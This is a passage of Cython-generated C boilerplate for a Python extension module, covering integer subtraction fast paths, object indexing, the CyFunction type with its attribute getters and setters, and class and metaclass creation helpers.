                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                default: return PyLong_Type.tp_as_number->nb_subtract(op1, op2);
            }
        }
                x = a - b;
            return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long:
                llx = lla - llb;
            return PyLong_FromLongLong(llx);
#endif
        
        
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
            double result;
            PyFPE_START_PROTECT("subtract", return NULL)
            result = ((double)a) - (double)b;
            PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceSubtract : PyNumber_Subtract)(op1, op2);
}
#endif

/* ObjectGetItem */
#if CYTHON_USE_TYPE_SLOTS
static PyObject *__Pyx_PyObject_GetIndex(PyObject *obj, PyObject* index) {
    PyObject *runerr;
    Py_ssize_t key_value;
    PySequenceMethods *m = Py_TYPE(obj)->tp_as_sequence;
    if (unlikely(!(m && m->sq_item))) {
        PyErr_Format(PyExc_TypeError, "'%.200s' object is not subscriptable", Py_TYPE(obj)->tp_name);
        return NULL;
    }
    key_value = __Pyx_PyIndex_AsSsize_t(index);
    if (likely(key_value != -1 || !(runerr = PyErr_Occurred()))) {
        return __Pyx_GetItemInt_Fast(obj, key_value, 0, 1, 1);
    }
    if (PyErr_GivenExceptionMatches(runerr, PyExc_OverflowError)) {
        PyErr_Clear();
        PyErr_Format(PyExc_IndexError, "cannot fit '%.200s' into an index-sized integer", Py_TYPE(index)->tp_name);
    }
    return NULL;
}
static PyObject *__Pyx_PyObject_GetItem(PyObject *obj, PyObject* key) {
    PyMappingMethods *m = Py_TYPE(obj)->tp_as_mapping;
    if (likely(m && m->mp_subscript)) {
        return m->mp_subscript(obj, key);
    }
    return __Pyx_PyObject_GetIndex(obj, key);
}
#endif

/* FetchCommonType */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* fake_module;
    PyTypeObject* cached_type = NULL;
    fake_module = PyImport_AddModule((char*) "_cython_" CYTHON_ABI);
    if (!fake_module) return NULL;
    Py_INCREF(fake_module);
    cached_type = (PyTypeObject*) PyObject_GetAttrString(fake_module, type->tp_name);
    if (cached_type) {
        if (!PyType_Check((PyObject*)cached_type)) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s is not a type object",
                type->tp_name);
            goto bad;
        }
        if (cached_type->tp_basicsize != type->tp_basicsize) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s has the wrong size, try recompiling",
                type->tp_name);
            goto bad;
        }
    } else {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
        PyErr_Clear();
        if (PyType_Ready(type) < 0) goto bad;
        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*) type) < 0)
            goto bad;
        Py_INCREF(type);
        cached_type = type;
    }
done:
    Py_DECREF(fake_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}

/* CythonFunctionShared */
#include <structmember.h>
static PyObject *
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *closure)
{
    if (unlikely(op->func_doc == NULL)) {
        if (op->func.m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp = op->func_doc;
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    op->func_doc = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = op->func_name;
    Py_INCREF(value);
    op->func_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = op->func_qualname;
    Py_INCREF(value);
    op->func_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_self(__pyx_CyFunctionObject *m, CYTHON_UNUSED void *closure)
{
    PyObject *self;
    self = m->func_closure;
    if (self == NULL)
        self = Py_None;
    Py_INCREF(self);
    return self;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    tmp = op->func_dict;
    Py_INCREF(value);
    op->func_dict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyTuple_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_tuple;
    op->defaults_tuple = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_tuple;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_kwdict;
    op->defaults_kwdict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_kwdict;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value || value == Py_None) {
        value = NULL;
    } else if (!PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    tmp = op->func_annotations;
    op->func_annotations = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->func_annotations;
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "__self__", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, CYTHON_UNUSED PyObject *args)
{
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(m->func.m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
    op->func.m_ml = ml;
    op->func.m_self = (PyObject *) op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    op->func.m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
    op->func_classobj = NULL;
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(m->func.m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
    Py_CLEAR(m->func_classobj);
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    PyObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(m->func.m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(m->func_classobj);
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject *__Pyx_CyFunction_descr_get(PyObject *func, PyObject *obj, PyObject *type)
{
#if PY_MAJOR_VERSION < 3
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {
        Py_INCREF(func);
        return func;
    }
    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {
        if (type == NULL)
            type = (PyObject *)(Py_TYPE(obj));
        return __Pyx_PyMethod_New(func, type, (PyObject *)(Py_TYPE(type)));
    }
    if (obj == Py_None)
        obj = NULL;
#endif
    return __Pyx_PyMethod_New(func, obj, type);
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
                #else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags in "
                        "__Pyx_CyFunction_Call. METH_OLDARGS is no "
                        "longer supported!");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
    0,
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_CyFunction_descr_get,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
};
static int __pyx_CyFunction_init(void) {
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}

/* CythonFunction */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}

/* CalculateMetaclass */
static PyObject *__Pyx_CalculateMetaclass(PyTypeObject *metaclass, PyObject *bases) {
    Py_ssize_t i, nbases = PyTuple_GET_SIZE(bases);
    for (i=0; i < nbases; i++) {
        PyTypeObject *tmptype;
        PyObject *tmp = PyTuple_GET_ITEM(bases, i);
        tmptype = Py_TYPE(tmp);
#if PY_MAJOR_VERSION < 3
        if (tmptype == &PyClass_Type)
            continue;
#endif
        if (!metaclass) {
            metaclass = tmptype;
            continue;
        }
        if (PyType_IsSubtype(metaclass, tmptype))
            continue;
        if (PyType_IsSubtype(tmptype, metaclass)) {
            metaclass = tmptype;
            continue;
        }
        PyErr_SetString(PyExc_TypeError,
                        "metaclass conflict: "
                        "the metaclass of a derived class "
                        "must be a (non-strict) subclass "
                        "of the metaclasses of all its bases");
        return NULL;
    }
    if (!metaclass) {
#if PY_MAJOR_VERSION < 3
        metaclass = &PyClass_Type;
#else
        metaclass = &PyType_Type;
#endif
    }
    Py_INCREF((PyObject*) metaclass);
    return (PyObject*) metaclass;
}

/* Py3ClassCreate */
static PyObject *__Pyx_Py3MetaclassPrepare(PyObject *metaclass, PyObject *bases, PyObject *name,
                                           PyObject *qualname, PyObject *mkw, PyObject *modname, PyObject *doc) {
    PyObject *ns;
    if (metaclass) {
        PyObject *prep = __Pyx_PyObject_GetAttrStr(metaclass, __pyx_n_s_prepare);
        if (prep) {
            PyObject *pargs = PyTuple_Pack(2, name, bases);
            if (unlikely(!pargs)) {
                Py_DECREF(prep);
                return NULL;
            }
            ns = PyObject_Call(prep, pargs, mkw);
            Py_DECREF(prep);
            Py_DECREF(pargs);
        } else {
            if (unlikely(!PyErr_ExceptionMatches(PyExc_AttributeError)))
                return NULL;
            PyErr_Clear();
            ns = PyDict_New();
        }
    } else {
        ns = PyDict_New();
    }
    if (unlikely(!ns))
        return NULL;
    if (unlikely(PyObject_SetItem(ns, __pyx_n_s_module, modname) < 0)) goto bad;
    if (unlikely(PyObject_SetItem(ns, __pyx_n_s_qualname, qualname) < 0)) goto bad;
    if (unlikely(doc && PyObject_SetItem(ns, __pyx_n_s_doc, doc) < 0)) goto bad;
    return ns;
bad:
    Py_DECREF(ns);
    return NULL;
}
static PyObject *__Pyx_Py3ClassCreate(PyObject *metaclass, PyObject *name, PyObject *bases,
                                      PyObject *dict, PyObject *mkw,
                                      int calculate_metaclass, int allow_py2_metaclass) {
    PyObject *result, *margs;
    PyObject *owned_metaclass = NULL;
    if (allow_py2_metaclass) {
        owned_metaclass = PyObject_GetItem(dict, __pyx_n_s_metaclass);
        if (owned_metaclass) {
            metaclass = owned_metaclass;
        } else if (likely(PyErr_ExceptionMatches(PyExc_KeyError))) {
            PyErr_Clear();
        } else {
            return NULL;
        }
    }
    if (calculate_metaclass && (!metaclass || PyType_Check(metaclass))) {
        metaclass = __Pyx_CalculateMetaclass((PyTypeObject*) metaclass, bases);
        Py_XDECREF(owned_metaclass);
        if (unlikely(!metaclass))
            return NULL;
        owned_metaclass = metaclass;
    }
    margs = PyTuple_Pack(3, name, bases, dict);
    if (unlikely(!margs)) {
        result = NULL;
    } else {
        result = PyObject_Call(metaclass, margs, mkw);
        Py_DECREF(margs);
    }
    Py_XDECREF(owned_metaclass);
    return result;
}

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_NCP_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
